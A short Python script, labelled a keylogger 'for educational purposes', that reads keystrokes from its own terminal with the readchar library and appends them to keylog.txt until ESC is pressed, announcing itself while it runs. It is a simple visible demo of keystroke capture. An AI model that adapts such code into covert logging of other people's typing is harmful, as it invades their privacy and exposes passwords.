import readchar

def keylogger():
    with open("keylog.txt", "a") as log_file:
        print("Keylogger is running... Press 'ESC' to stop.")
        print("caution: This keylogger is intended for educational purposes only. Use it responsibly and ethically. Unauthorized use of keyloggers can lead to serious legal consequences.")
        while True:
            key = readchar.readkey()
            
            log_file.write(f"{key}\n")
            
            if key == '\x1b': 
                print("Keylogger stopped.")
                break

if __name__ == "__main__":
    keylogger()
